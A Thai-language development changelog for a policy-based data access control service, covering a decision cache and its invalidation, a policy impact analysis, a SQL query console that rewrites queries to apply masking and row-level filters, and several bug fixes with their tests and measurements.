คำตอบคือ **entry หนึ่งตัวต้องตายได้ 3 ทาง อิสระจากกัน**:

| สิ่งที่ทำให้คำตอบเก่า | กลไก | ครอบอะไร |
|---|---|---|
| มีคนเขียน | `ChangeNotifier` → flush ทั้งก้อน + บวก generation | policy, binding, identity, catalog change, catalog crawl |
| เวลาเดิน | `DecisionValidity.until()` → ใส่ `validUntil` ต่อ entry | time window, `validFrom`/`validUntil`, `exemption.expiresAt` |
| อะไรก็ไม่รู้ | TTL 60s | write path ที่จะเพิ่มทีหลังแล้วลืม publish · instance ที่สองที่เราไม่ได้ยิน flush ของมัน |

> **สามชั้นนี้ไม่ได้ทำงานซ้ำกัน** — ชั้นแรกคือสิ่งที่ประกาศตัว ชั้นสองคือสิ่งที่ไม่มีใครประกาศ (นาฬิกา) ชั้นที่สามคือสิ่งที่เราคิดไม่ถึง

#### AB.2 ทำไม store เป็นคนประกาศ ไม่ใช่ REST resource

`ChangeNotifier` (ใหม่ ใน `dac-common`) — listener list ธรรมดา ยิง `fire(reason)` **หลัง commit บน thread เดิม**

ถ้าไปต่อ invalidation ไว้ที่ resource มันจะพัง**ครั้งแรกที่ write มาทางอื่น** — webhook จาก OM, poller, nightly reconcile ไม่ได้ผ่าน REST layer เลย และมันจะ**ไม่ error** มันจะแค่เสิร์ฟ decision เก่าต่อไปเงียบๆ

publisher ทั้งหมด 5 ตัว สมัครไว้ที่เดียวใน `DacApplication` เพื่อให้การลืม publisher ตัวที่ 6 เห็นได้จากที่เดียว:

| publisher | ยิงเมื่อ | ทำไม |
|---|---|---|
| `PolicyStore` | create / update / transition | ACTIVE↔DISABLED คือนาทีที่ enforcement เริ่มและหยุด |
| `PolicyBindingMaterializer` | เมื่อ binding **เปลี่ยนจริง** (`result.changed()`) | nightly reconcile re-resolve ทุก policy แต่เกือบไม่มีอะไรเปลี่ยน — ยิงทุกครั้งคือล้าง cache วันละหลายร้อยรอบฟรีๆ |
| `IdentityAdminStore` | สร้าง account / enable / disable / grant / revoke role | ชื่อที่เมื่อกี้ยัง resolve ไม่ได้ ตอนนี้ resolve ได้ → denial ที่ cache ไว้ต้องหาย · `resetPassword` **ไม่** ยิง (เปลี่ยน decision ไม่ได้) |
| `CatalogChangeApplier` | webhook/poller ที่ไม่ quiet | **tag ที่ลง column คือ policy change ที่ไม่มีใครในระบบนี้เป็นคนเขียน** — ชนิดที่ cache พลาดง่ายที่สุด |
| `CatalogSyncService` | crawl จบ | crawl เขียน facet ทั้ง estate |

ที่**จงใจไม่ใส่**: source registry กับ query executor — สองตัวนี้เปลี่ยนว่า "อ่านข้อมูลจากที่ไหน" ไม่ได้เปลี่ยนว่า "ใครเห็นอะไร"

#### AB.3 การเขียน test เจอรูโหว่ในโค้ดที่เพิ่งเขียนไปเอง — flush ที่ดูเหมือนทำงานแต่ไม่ได้ทำ

ฉบับแรก `put()` อ่าน `generation` **ตอนเก็บ** ซึ่งผิด:

```
thread A  17:59:59  อ่าน policy stack (generation = 7)
thread B  18:00:00  disable policy → flush, generation = 8
thread A  18:00:01  put() → อ่าน generation ได้ 8 → เก็บสำเร็จ
            → คำตอบที่คำนวณจาก policy ที่ถูกปิดไปแล้ว ถูกเสิร์ฟต่ออีก 1 นาที
```

แก้ด้วยให้ `DecisionService` อ่าน `cache.generation()` **ก่อนแตะ DB** แล้วส่งค่านั้นเข้า `put(..., readAt)` — `put` เช็คสองรอบ (ก่อน serialize และอีกทีใน lock) ถ้าไม่ตรงคือทิ้งและนับเข้า `lapped`

#### AB.4 test เองเจอบั๊กอีกตัว — mapper ที่เขียน `Instant` ไม่ได้

รอบแรกที่รัน `DecisionCacheTest` **แดง 7/14** ด้วยอาการเดียว: ไม่มีอะไรถูกเก็บเลย สาเหตุคือ test ใช้ `new ObjectMapper()` เปล่าๆ ซึ่งเขียน `Instant` ไม่ได้ (ไม่มี JSR-310 module) → `put()` throw → โดน catch → **เงียบ**

แต่สิ่งที่ test ชี้คือโหมดพังที่อันตรายจริงๆ:

> **cache ที่ไม่เก็บอะไรเลย คือ cache ที่ไม่เคยตอบผิด** — ทุก endpoint ยังตอบถูก ทุก test ยังเขียว ไม่มีอะไรบอกว่า NFR-2 ไม่ถูกทำตาม นอกจาก log WARN บรรทัดเดียว

แก้สองทาง:
1. **test** ใช้ `Jackson.newObjectMapper()` ตัวเดียวกับที่ Dropwizard สร้าง — mapper คือส่วนหนึ่งของสิ่งที่ถูกทดสอบ
2. **production** เพิ่ม counter `unstorable` ใน `Stats` + log stack trace แค่ครั้งแรก → ดูที่ `/v1/system/decision-cache` แล้วเห็นทันที ไม่ต้องไปงม log
3. เพิ่ม test ที่ยืนยันว่าโหมดนี้**นับได้** ไม่ใช่แค่ log

อีกตัวหนึ่งที่ test เจอ: `expiresAtIsHonoured` ตั้ง `expiresAt` ไว้ที่ +600s ขณะที่ TTL แค่ 60s → TTL ฆ่า entry ก่อน — **test ผิด ไม่ใช่โค้ดผิด** แก้ด้วยให้ test นั้นใช้ TTL 1 ชม. เพื่อให้ขอบที่ทดสอบคือขอบที่ policy ให้มาจริงๆ

#### AB.5 ที่เก็บเป็น JSON bytes ไม่ใช่ object

POJO ที่ generate มามี `withX(...)` ที่ **mutate in place แล้ว return this** — ถ้าเก็บ object ตรงๆ caller คนแรกที่ติด `fromCache` จะติดค้างไว้ใน cache ถาวร และอะไรก็ตามที่มันแก้ต่อจะติดตามไปด้วย · serialize/deserialize จ่ายหลักสิบไมโครวินาทีเทียบกับงบ 10ms ถือว่าคุ้ม

#### AB.6 วัดจริง ไม่ได้อ้างเอกสารออกแบบ

backend ที่รันอยู่จริง → login admin → `POST /v1/decisions` 1 cold + 6 warm บน `analyst_a` / `dtp-iprm.iprm.public.customers`:

| | ค่า |
|---|---|
| cold (รวม JWT verify + Jetty) | **0.116s** |
| warm | **0.017 / 0.0155 / 0.0249 / 0.0181s** |
| `GET /v1/system/decision-cache` | `hits=6, misses=1, entries=1, bytes=449, evictions=0, invalidations=0` |

`fromCache=true` ขึ้นจริงใน response · **ผ่านงบ NFR-2 (<10ms cached / <100ms cold) โดยที่ตัวเลขข้างบนนับรวม HTTP overhead ทั้งหมดแล้ว**

#### AB.7 ของที่เพิ่มรอบนี้

**ไฟล์ใหม่**
- `dac-common/.../ChangeNotifier.java`
- `dac-engine/.../DecisionValidity.java` + `DecisionValidityTest.java` (10 tests)
- `dac-service/.../policy/DecisionCache.java` + `DecisionCacheTest.java` (15 tests)
- `dac-service/.../config/DecisionCacheConfiguration.java`

**แก้**
- `DecisionService` — `Ask.at` ไม่ default เป็น `Instant.now()` อีกต่อไป · `when()` / `live()` · **null ≠ now** (null = "ตอนไหร่ก็ตามที่รัน" และ**เฉพาะอันนั้นที่ cache ได้** — simulation ที่ pin เวลาถามคนละคำถาม)
- `QueryService` — ส่ง `null` เป็น `at` เพื่อให้ path ที่ร้อนที่สุด cache ได้
- `PolicyStore` / `PolicyBindingMaterializer` / `IdentityAdminStore` / `CatalogChangeApplier` / `CatalogSyncService` — เพิ่ม `changes()`
- `DacApplication` — สร้าง cache ก่อน store ทุกตัว + subscribe 5 publisher
- `SystemResource` — `GET /v1/system/decision-cache` (**หลัง auth filter** ต่างจาก `/version` เพราะ `lastInvalidationReason` มีชื่อ policy หรือชื่อคน)
- `DacConfiguration` + `conf/dac.yml` — block `decisionCache`

**env ใหม่ 3 ตัว** (มี default หมด ไม่ต้องตั้ง)
| | default | เมื่อไหร่ถึงแตะ |
|---|---|---|
| `DECISION_CACHE_ENABLED` | `true` | **สิ่งแรกที่ควรลองเมื่อ decision ดูเก่าแล้วหาสาเหตุไม่เจอ** — ปิดแล้ว restart จ่าย 3 DB read ต่อ decision |
| `DECISION_CACHE_MAX_ENTRIES` | `50000` | heap ไม่พอ (entry ละ ~450 bytes → 50k ≈ 22MB) |
| `DECISION_CACHE_TTL_SECONDS` | `60` | เพดานของ "นานแค่ไหนที่คำตอบผิดอยู่ได้ถ้าไม่มีใครประกาศ" · **ถ้า deploy หลาย instance ต้องลดตัวนี้** เพราะ generation counter เป็น single-process |

#### AB.8 ข้อจำกัดที่ต้องรู้

- **generation counter เป็น single-process** — สอง instance จะไม่ได้ยิน flush ของกันและกัน สิ่งเดียวที่คุ้มกันคือ TTL → **ก่อน scale out ต้องย้าย invalidation ไปอยู่บน pub/sub หรือลด TTL เหลือหน่วยวินาที**
- flush เป็นแบบ**ทั้งก้อน** ไม่ได้เลือกลบเฉพาะ key ที่กระทบ — จงใจ เพราะ map จาก "policy นี้เปลี่ยน" → "คนเหล่านี้บน table เหล่านี้ผิดแล้ว" ต้องเดินผ่าน selector + group closure + facet inheritance และ**เวอร์ชันที่ไม่ครบของมันไม่ throw — มันแค่ปล่อยให้บางคนเข้าได้ต่อไปเงียบๆ**
- `DecisionValidity` จงใจ**ทำซ้ำ minute granularity ของ `PolicyEngine.cacheKey()`** แทนที่จะคำนวณขอบ window เอง — สองที่คิดเรื่องเวลาต่างกันคือสองที่จะค่อยๆ ไม่ตรงกัน · มี test `matchesEngineGranularity` คอยจับถ้าสองตัวเริ่มไม่ตรงกัน
- `DecisionValidity` ดู **policy ทั้ง stack ไม่ใช่เฉพาะตัวที่ match** — policy ที่จะเริ่มมีผลเที่ยงคืนต้องจบ entry นี้ด้วย ถึงแม้วันนี้มันไม่ได้พูดอะไรเลย

---

## รอบก่อนหน้า — Impact analysis (FR-5.3) · **ปิด M4**

> ข้อสุดท้ายของ M4 · รอบนี้แตะ backend (3 ไฟล์แก้ + 1 ไฟล์ใหม่ + 1 IT ใหม่) และ frontend (2 ไฟล์) · **ไม่มี migration** — คำถามนี้ตอบได้ด้วยของที่มีอยู่แล้วทั้งหมด

### AA. "ถ้าเปิด policy นี้ ใครกระทบบ้าง" (FR-5.3)

#### AA.1 คำถามที่ดูง่ายแต่ตอบผิดได้ง่ายกว่า

สิ่งที่คนคาดว่าจะเห็นตรงนี้คือ **จำนวน binding** — "policy นี้ผูกกับ 40 table, 12 column" ซึ่ง `PolicyOverview.coverage()` ตอบอยู่แล้วและ **เป็นคำตอบที่ผิด**:

> policy ที่ผูกกับ 40 table อาจ **ไม่เปลี่ยนอะไรให้ใครเลยแม้แต่คนเดียว** ถ้าทุกอย่างที่มันห้าม ถูกห้ามอยู่แล้วโดยชั้นที่อยู่เหนือมัน
> ในทางกลับกัน policy ที่ผูกกับ **table เดียว** อาจตัดคนทั้งบริษัทออกจากข้อมูลนั้น

เพราะ composition เป็น intersection (FR-5.1) "เพิ่ม policy หนึ่งตัว" จึงไม่ได้แปลว่า "เพิ่มข้อจำกัดหนึ่งข้อ" · คำตอบที่ถูกคือ **counterfactual**: สำหรับทุกคู่ (คน, table) ให้ engine ตัดสินสองครั้ง — **มี** policy นี้ในกอง กับ **ไม่มี** — แล้วรายงานเฉพาะส่วนที่ต่าง

#### AA.2 สองโลกที่ต่างกันแค่ policy เดียว — บังคับด้วย SQL ไม่ใช่ด้วยวินัย

`PolicyStore.activeForIncluding(assetFqn, environment, candidate)` (ใหม่) — query เดียวกับ `activeFor()` ทุกประการ **บวกเงื่อนไข `p.id = :candidate` เข้าไปใน `WHERE`** เพื่อให้ draft ที่ยังไม่ ACTIVE ถูกดันเข้ากองด้วย

ทำไมต้องยัดใน SQL แทนที่จะ `list.add(draft)` ใน Java: ลำดับชั้น `ORG → DOMAIN → … → COLUMN` อยู่ใน `ORDER BY CASE p.scope_level …` ของ query นั้น · ถ้าแทรกจากฝั่ง Java ต้อง**เขียนลำดับนั้นซ้ำอีกที่หนึ่ง** แล้วสองที่จะค่อยๆ ไม่ตรงกัน

แล้วโลกที่ "ไม่มี" ได้มาจาก **กรองลิสต์เดิมในหน่วยความจำ** ไม่ใช่ query ใหม่:

```java
List<Policy> withDocs    = documents(with, null);   // ทั้งกอง
List<Policy> withoutDocs = documents(with, id);     // กองเดิม ลบตัวเดียว
```

> query สองครั้งจะต่างกันได้**มากกว่าหนึ่ง policy** — policy อื่นหมดอายุระหว่างสองคำสั่งก็เป็นไปได้ · แล้ว impact report จะไปโทษ policy นี้ว่าเป็นต้นเหตุของการหมดอายุของคนอื่น ซึ่งแย่กว่าไม่มี report

#### AA.3 `PrincipalLoader.everyone()` — และทำไม group ไม่ถูกนับ

`find()` เดิมโหลดทีละคนด้วย 4 query · วน 200 คนจะได้ 800 query → เพิ่ม `everyone(handle, limit)` ที่ยิง **4 query รวม** (principal, app role, membership, attribute) แล้วประกอบเป็น `Principal` **รูปร่างเดียวกันเป๊ะ** กับ `find()` — สำคัญเพราะถ้าสองทางประกอบไม่เหมือนกัน หน้า impact กับหน้า simulator จะบรรยายคนคนเดียวกันคนละแบบ

membership ใช้ recursive CTE **สองคอลัมน์** ที่แบก seed member id ไปด้วย เพื่อให้ปิด transitive closure ของทุกคนได้ในคำสั่งเดียว:

```sql
WITH RECURSIVE reachable(member_id, group_id) AS (
    SELECT member_id, group_id FROM group_member WHERE member_id IN (<ids>)
  UNION
    SELECT r.member_id, m.group_id FROM group_member m
    JOIN reachable r ON m.member_id = r.group_id)
```

**group ไม่ถูกนับเป็น "คน"** — `principal_type IN ('USER','SERVICE')` เท่านั้น · group เป็นแถวใน `principal` เพื่อให้ membership ซ้อนกันได้ แต่ **ไม่มีใคร login เป็น group** และการนับ group รวมไปด้วยจะทำให้ทุกตัวเลขบนหน้าจอพองขึ้นโดยไม่มีความหมาย (มีเทสต์กันไว้: `principalsKnown == 3` ทั้งที่มี 4 แถวใน `principal`)

#### AA.4 6 ผลลัพธ์ เรียงตามความร้ายแรง — และ ordinal คือลำดับนั้นจริงๆ

```java
public enum Change { LOSES_ACCESS, GAINS_ACCESS, CHANGED, SEES_LESS, SEES_MORE, UNCHANGED }
```

`compare(fqn, before, after)` เทียบ **verdict ก่อน** (allow/deny พลิก = เรื่องใหญ่สุด) · ถ้า deny ทั้งสองข้าง = `UNCHANGED` (สิ่งที่ *จะ* ถูก mask ถ้าเข้าถึงได้ ไม่ใช่ความต่างที่ใครสังเกตได้) · ไม่งั้นค่อย diff สามชุด: `hidden()` / `masks()` / `rows()`

**mask เทียบด้วย `column:function:condition` ไม่ใช่ object identity** — column เดียวกันถูก mask ด้วย function เดียวกันแต่มาจาก policy คนละตัว **ไม่ใช่ความเปลี่ยนแปลงที่ใครมองเห็นในข้อมูล** และถ้ารายงานมันจะกลบความเปลี่ยนแปลงจริงที่อยู่ในรายการเดียวกัน

การ sort ใช้ `ordinal()` ตรงๆ ทั้งระดับ table และระดับคน (`worst = tables.get(0).change()`) · เคยเขียน `worseThan()` ไว้แล้วลบทิ้ง เพราะไม่มีใครเรียก — โค้ดตายที่อ่านเหมือนเป็นกฎ

#### AA.5 ประกาศว่าสุ่ม ไม่ใช่ซ่อนว่าสุ่ม

cap: **25 table × 200 principal × 2 evaluations** · แต่ `Impact` แบก `tablesBound` vs `tablesMeasured`, `principalsKnown` vs `principalsMeasured`, และ `sampled` ออกไปด้วยทุกครั้ง

- table ที่ผูกอยู่แต่ **ไม่มีใน cache** จะ `continue` โดย**ไม่เพิ่ม** `measured` — เวอร์ชันแรกรายงาน `fqns.size()` ซึ่งแปลว่า run ที่วัดได้ครึ่งเดียวจะขึ้นจอว่าวัดครบ
- ฝั่ง UI `sampled === true` เปลี่ยนคำเป็น **"at least"** ทุกที่ + ต่อท้ายว่า *"capped for speed, so these are floors rather than totals"*
- บรรทัดขอบเขต (`1 of 1 table · 3 of 3 people`) **ขึ้นเสมอ ไม่ใช่เฉพาะตอนไม่ครบ** — ตัวเลขที่ซ่อนตัวหารคือสิ่งที่ panel นี้มีไว้เพื่อไม่ให้เกิด

#### AA.6 draft กับ active ใช้เลขชุดเดียวกัน ต่างแค่กาล

`candidateActive` บอก UI ว่าจะเล่าด้วยกาลไหน — เลขไม่ต่างกันเลย เพราะ policy ที่ ACTIVE อยู่แล้วก็ถูกวัดเทียบกับ "โลกที่ไม่มีมัน" เหมือนกัน:

| | ประโยคบนจอ |
|---|---|
| DRAFT | *"Activating this would change what 2 people see on 1 table."* |
| ACTIVE | *"This policy is the reason 2 people see what they see on 1 table."* |
| กระทบ 0 คน | *"Activating this would change nothing for anyone. Everything it restricts is already restricted by the policies around it."* |

ป้ายทุกใบ (`loses the table` / `sees less` / …) เขียนจาก**มุมที่ policy เปิดอยู่** เสมอ เพราะเลขเดินทางเดียว — ประโยคข้างบนเท่านั้นที่เปลี่ยน

#### AA.7 ไฟล์

| ไฟล์ | |
|---|---|
| `policy/ImpactAnalysis.java` | **ใหม่ ~420 บรรทัด** — `measure(StoredPolicy)` · `TABLE_LIMIT=25` `PRINCIPAL_LIMIT=200` `DETAIL_LIMIT=50` · record `Impact` / `PrincipalChange` / `TableChange` |
| `policy/PolicyStore.java` | `+activeForIncluding(fqn, env, candidate)` |
| `policy/PrincipalLoader.java` | `+everyone()` `+countEveryone()` `+allMemberships()` (batched) |
| `resources/PolicyResource.java` | `GET /{id}/impact` · ctor รับ `ImpactAnalysis` เป็นตัวที่ 4 |
| `DacApplication.java` | ย้าย `PolicyEngine` ขึ้นมาก่อน `PolicyResource` + แชร์ `PrincipalLoader` ตัวเดียวกับ `DecisionService` (authoring ต้องใช้ engine ตัวเดียวกับ enforcement ไม่งั้น preview โกหกได้) |
| `test/.../ImpactAnalysisIT.java` | **ใหม่ 8 tests** บน Postgres จริง |
| `frontend/app/src/api/policies.ts` | `+PolicyImpact` / `PolicyImpactPrincipal` / `PolicyImpactTable` / `PolicyImpactChange` + `fetchPolicyImpact()` |
| `frontend/app/src/pages/policies/PolicyDetailPage.tsx` | panel `<Impact>` ระหว่าง Coverage กับ Conflicts · `refetchOnWindowFocus: false` (สองการ evaluate ต่อคนต่อ table — invalidate ตอน re-resolve / เปลี่ยน lifecycle แทน) |

#### AA.8 เทสต์

`ImpactAnalysisIT` **8 ตัว** — `baseline()` สร้างและ **activate** ORG SUBSCRIPTION ALLOW ก่อนทุกเคส เพราะถ้าไม่มี ทุก decision จะ deny ทั้งสองข้างและ**ทุกเทสต์จะผ่านแบบว่างเปล่า** (จดไว้ใน javadoc ของมันแล้ว)

- `Population` — group ไม่ถูกนับเป็นคน · estate เล็กวัดครบและบอกว่าครบ (`sampled == false`)
- `Changes` — draft ที่ deny ดึงสิทธิ์จากทุกคนที่เคยมี · **draft ที่ grant สิ่งที่ถูก grant อยู่แล้ว กระทบ 0 คน** (ข้อกลางของทั้งหมด) · denial ที่ผูกกับ attribute ระบุชื่อเฉพาะคนที่ตก · draft ที่ mask บอกชื่อ column ที่มันแคบลง · policy ที่ ACTIVE อยู่แล้ววัดเทียบโลกที่ไม่มีมัน · policy ที่ไม่ผูกกับอะไรเลยคือ report ว่าง ไม่ใช่ error

`PolicyDetailPage.test.tsx` **+5 ตัว** (11 → 16) — กระทบ 0 คนต้องพูดออกมาแม้ผูก 40 table · คนที่เสียสิทธิ์ต้องถูกระบุชื่อพร้อม table · ACTIVE ต้องเล่าด้วยกาลปัจจุบัน · run ที่สุ่มต้องขึ้น "at least" · ผูก 0 table ต้องบอกให้ไป re-resolve ไม่ใช่โชว์เลข 0

#### AA.9 ยิงจริงกับ backend ที่รันอยู่

```
GET /api/v1/policies/b594579f…/impact   (finance-subscription, ACTIVE)
  tablesBound 1 · principalsKnown 4 · sampled false
  principalsAffected 2 · byChange { GAINS_ACCESS: 2, UNCHANGED: 2 }
  analyst_a GAINS_ACCESS  "can read this table"
  steward_c GAINS_ACCESS  "can read this table"

GET /api/v1/policies/1a294978…/impact   (pii-masking-below-l2, ACTIVE)
  principalsAffected 1 · byChange { SEES_LESS: 1, UNCHANGED: 3 }
  analyst_a SEES_LESS  "citizen_id, email now masked"
```

อ่านได้ตรงกับที่ควรเป็น: `finance-subscription` เป็น**ตัวเดียว**ที่เปิดประตู → ถอดออกแล้วสองคนหมดสิทธิ์ · `pii-masking-below-l2` แตะเฉพาะ `analyst_a` เพราะ `steward_c` clearance ผ่าน L2

> **ทำตามกับดักเดิมแล้ว** — restart backend ก่อนยิง เพราะ `verify` เพิ่งเขียนทับ `dac-service.jar` ใต้ JVM ที่เปิดไฟล์นั้นค้างอยู่ (ดู Z.5)

---

## รอบก่อนหน้านี้ (ข้อ A–Z) — Query console (5.2a ใช้งานได้จริง) + บั๊กร้ายแรงสามตัว

รอบนี้คือรอบที่ **โหมด 5.2 เดินจากต้นจนจบได้จริงเป็นครั้งแรก** — พิมพ์ SQL ในเบราว์เซอร์ -> rewrite ตาม policy -> ยิงลง Postgres จริง -> ได้แถวที่ถูก filter และ column ที่ถูก mask กลับมา พร้อม audit ครบ

### A. หน้า Query console (M7 / FR-6.3, 5.2a)

ผู้ใช้ถามว่า *"เวลา Query ข้อมูลใน Database นี่ต้องกดตรงไหน"* — คำตอบคือยังไม่มี จึงสร้างขึ้นรอบนี้ แบบเดียวกับ BigQuery / Denodo

| ไฟล์ | หน้าที่ |
|---|---|
| `frontend/app/src/api/query.ts` (ใหม่) | `runQuery()` + type `QueryResult` · `MAX_ROWS = 5000` · `DEFAULT_ROWS = 200` |
| `frontend/app/src/pages/query/SqlEditor.tsx` (ใหม่) | editor สามชั้น: gutter + `<pre>` ที่ไฮไลต์ + `<textarea>` ตัวอักษรใสทับอยู่บนสุด · tokenizer เขียนเอง · Ctrl/Cmd+Enter = run · Tab = indent · **ไม่ใช้ Monaco** (ไม่กี่ร้อยบรรทัด เทียบกับ bundle หลาย MB และไม่มีอะไรบนจอนี้ต้องใช้ language server) |
| `frontend/app/src/pages/query/SchemaExplorer.tsx` (ใหม่) | tree ฝั่งซ้าย สร้างจาก **asset cache ไม่ใช่ `information_schema`** — table ที่ crawl ยังไม่เห็น = table ที่ engine ยังไม่มี decision ให้ กดไปก็ได้แค่คำปฏิเสธ · column lazy-load · column ที่มี tag ติดป้าย `tagged` |
| `frontend/app/src/pages/query/QueryPage.tsx` (ใหม่) | เลือก source · **Run as** (ดูแบบคนอื่น FR-5.2) · purpose · row limit · ตาราง result · **แท็บ "Rewritten SQL" โชว์ SQL จริงที่ถูกส่งไป** (FR-5.4) · แถบ unenforceable |
| `navigation.ts` · `App.tsx` | เพิ่มเมนู Query + route |

### B. QueryRewriter — บั๊กสองตัวที่ทำให้ gate สองชั้นปฏิเสธทุก query

1. **gate ชั้นสองดู output แทน input** — หลัง rewrite แล้ว derived table **ต้อง** มีชื่อ table จริงอยู่ข้างในเสมอ gate ที่ไล่หาชื่อ table ใน SQL ผลลัพธ์จึงปฏิเสธทุกอย่าง รวมถึงของที่ rewrite สำเร็จ -> เปลี่ยนไปเทียบ "table ที่ walk เจอ" กับ "table ที่ parser เห็นทั้งหมด" แทน
2. **เหตุผลที่ตอบกลับตอนถูกปฏิเสธเป็นคนละเรื่อง** — ขึ้นว่า `access is denied: subject rule satisfied` เพราะหยิบ `reasons[0]` มาโดยไม่ดู `matched`/`effect` -> เขียนใหม่ให้เลือก **DENY ที่ matched ก่อน แล้วค่อย ALLOW ที่ไม่ matched**

เขียน `QueryRewriterTest` **16 tests** คุมทั้ง happy path, gate ทั้งสองชั้น, CTE, UNION, alias, hidden column, และ subquery ใน `WHERE EXISTS` ที่ต้อง **fail-closed**

### C. รูปร่างของ SQL ที่ proxy ใส่เข้าไป (ตัวอย่างจริงที่ capture มา)

ผู้ใช้ถามว่า *"ตอน proxy ใส่ Syntax อะไรเข้าไป"* — pattern คือ **ห่อ table ที่ถูกคุมไว้เป็น derived table**: mask อยู่ใน projection · row filter อยู่ใน `WHERE` ของ derived table · column ที่ซ่อนคือไม่ถูก list ออกมาเลย · `WHERE`/alias/`ORDER BY` ของผู้ใช้อยู่ **ข้างนอก**

ผู้ใช้เขียน:

```sql
SELECT full_name, email, salary FROM sales.customer
```

สิ่งที่ถูกส่งไปที่ Postgres จริง (`analyst_a`):

```sql
SELECT full_name, email, salary
FROM (SELECT "t"."id", "t"."full_name",
             regexp_replace(CAST("t"."email" AS text), '^[^@]+', '***', 'g') AS "email",
             CASE WHEN "t"."citizen_id" IS NULL THEN NULL
                  ELSE repeat('*', GREATEST(length(CAST("t"."citizen_id" AS text)) - 4, 0))
                       || right(CAST("t"."citizen_id" AS text), 4) END AS "citizen_id",
             "t"."phone", "t"."salary", "t"."branch_code", "t"."country", "t"."created_at"
      FROM "sales"."customer" "t"
      WHERE ("t"."branch_code" IN ('BKK-01'))) "customer"
```

### D. พิสูจน์โหมด 5.2 กับข้อมูลจริง

Source `demo-pg` (`dac-srcpg`, db `salesdb`) · `sales.customer` 4 แถว · policy 3 ตัว (`finance-subscription` ORG · `pii-masking-below-l2` ORG · `sales-branch-rls` SCHEMA)

| Run as | attribute | ผลลัพธ์ | โดนอะไร |
|---|---|---|---|
| `analyst_a` | clearance=L1 · country=TH · branch=BKK-01 | 2 แถว · `email` = `***@example.co.th` · `citizen_id` = `*********3456` | **RLS + Mask** |
| `steward_c` | clearance=L2 · country=TH · branch=BKK-01 **และ** CNX-01 | **3 แถว** · email/citizen_id เห็นเต็ม | RLS อย่างเดียว |
| `analyst_b` | country=SG | ถูกปฏิเสธ พร้อมชื่อ policy + เงื่อนไขที่ไม่ผ่าน | Subscription ตัด |
| admin (ไม่เลือก Run as) | – | ถูกปฏิเสธ — ไม่มี principal จึงไม่มี decision | fail-closed |
| ใครก็ได้ + `WHERE EXISTS (SELECT 1 FROM sales.customer)` | – | ถูกปฏิเสธ `does not rewrite` | gate ชั้นสอง |

### E. BUG — audit row หายหมดทุกแถว เพราะ `inet` ไม่รับสิ่งที่ Jetty ส่งมา

`ERROR: invalid input syntax for type inet: "[0:0:0:0:0:0:0:1]"` — Jetty คืน IPv6 loopback **พร้อมวงเล็บเหลี่ยม** แต่ `inet` ของ Postgres ไม่รับ -> insert throw -> `QueryService` catch แล้ว log ต่อ (ตั้งใจ ไม่ให้ audit ที่ล้มไปฆ่า query ที่ถูกอนุญาต) **ผลคือทุก query รันโดยไม่ถูกบันทึกเลย** ซึ่งคือการเสียหลักฐาน compliance ทั้งชุด (FR-8.2, FR-8.3)

แก้ด้วย `QueryService.inet()`: ตัดวงเล็บ · ตัด zone index (`fe80::1%eth0`) · **กรองด้วย regex ให้เหลือเฉพาะ IP literal ก่อน** แล้วค่อยเรียก `InetAddress.getByName` (ถ้าไม่กรองก่อน มันจะไป resolve DNS ซึ่งเป็นที่สุดท้ายที่ตอนเขียน audit ควรแตะ network) · **เสียที่อยู่ยอมได้ เสียทั้งแถวไม่ได้** · `QueryServiceInetTest` **6 tests**

หลังแก้: `grep -c "Could not write" backend-run.log` -> **0** · `client_ip` = `::1`

### F. BUG — `audit_decision.matched_policy_ids` ว่างทุกแถว

engine ใส่ `.withPolicyId(policy.getId())` ถูกแล้ว แต่ **`id` เป็น column ไม่ได้อยู่ใน JSON document** -> policy ที่ deserialize ออกมาจาก `document` มี `id == null` ทุกตัว -> audit บอกชื่อ policy ได้แต่ชี้กลับไปหาไม่ได้ (FR-5.4, FR-8.2)

แก้ที่ `PolicyStore.deserialise(id, document)` ให้ประทับ id ของ row กลับลงบน POJO และแก้จุดเดียวกันใน `PolicyBindingMaterializer` · **verify แล้ว** — แถวใหม่มี `matched_policy_ids` 2–3 ตัว

### G. BUG — multi-value attribute ไม่กลายเป็น `IN (...)` (FR-4.1 พัง)

`steward_c` มี `branch` สองค่า (BKK-01 **และ** CNX-01) แต่ SQL ที่ออกมาคือ `branch_code = 'BKK-01'` เฉยๆ -> เห็น 2 แถวแทนที่จะเป็น 3

ไล่แล้วไม่ใช่ `PrincipalLoader` (select ครบ) ไม่ใช่ `Principal.attributeValues` (เก็บครบ) ไม่ใช่ `PolicyEngine` (ส่ง `values` ครบ) — **อยู่ที่ `DecisionSql.compare`**: มัน switch ตาม `operator` ไม่ใช่ `kind` และ policy document เขียนว่า `{"kind":"IN_LIST","column":"branch_code","userAttribute":"branch"}` **ไม่มี `operator`** -> default เป็น `EQ` -> `EQ` อ่าน `values.get(0)` ตัวเดียว **ค่าที่เหลือหายเงียบ**

นี่คือบั๊กชนิดที่แย่ที่สุดในงานนี้: **SQL ที่ generate ออกมาหน้าตาถูกต้องทุกอย่าง ผิดแค่จำนวนแถว** และผิดในทางที่เข้มเกินไป เลยไม่มีใครร้อง

แก้ด้วย `DecisionSql.membership(kind, operator, count)`:

- `operator == null` + `kind == IN_LIST` -> `IN`
- `operator == null` อื่นๆ -> `EQ` (เหมือนเดิม)
- `EQ` แต่ได้ค่ามามากกว่าหนึ่ง -> **ขยายเป็น `IN`** (คนเขียนหมายถึง "ตรงกับค่าของผู้อ่าน" และผู้อ่านมีหลายค่า — กว้างขึ้นดีกว่าทิ้งทั้งหมดยกเว้นตัวแรก)
- `NE` ได้หลายค่า -> `NOT_IN`

`DecisionSqlRowFilterTest` **7 tests** (module `dac-compiler-sql` เพิ่งมี test เป็นครั้งแรก) · verify สด: `steward_c` ได้ `IN ('BKK-01', 'CNX-01')` -> **3 แถว**

### H. สามเรื่อง UI ที่ผู้ใช้ชี้

1. *"อันนี้ไม่ต้องมีสิ ให้เขาใส่ได้เองไหม"* — dropdown row limit 4 ตัวเลือก ไม่มีวันเป็นตัวเลขที่คนต้องการ -> เปลี่ยนเป็น `TextField` กรองเฉพาะตัวเลข + ข้อความ `(capped at 5000)` ข้างๆ เพราะ server clamp อยู่แล้ว field อิสระจึงพังอะไรไม่ได้
2. *"เวลา highlight แล้วมันหาย"* — selection ถูกวาดโดย `<textarea>` ที่อยู่ **บน** ชั้นที่มีตัวอักษรจริง สี selection ทึบจึงบังสิ่งที่กำลังเลือกอยู่ -> `tw:selection:bg-[rgba(41,112,255,0.28)]`
   > **บทเรียนทั่วไป: editor ที่ซ้อนชั้น ต้องใช้สี selection ที่มี alpha เสมอ**
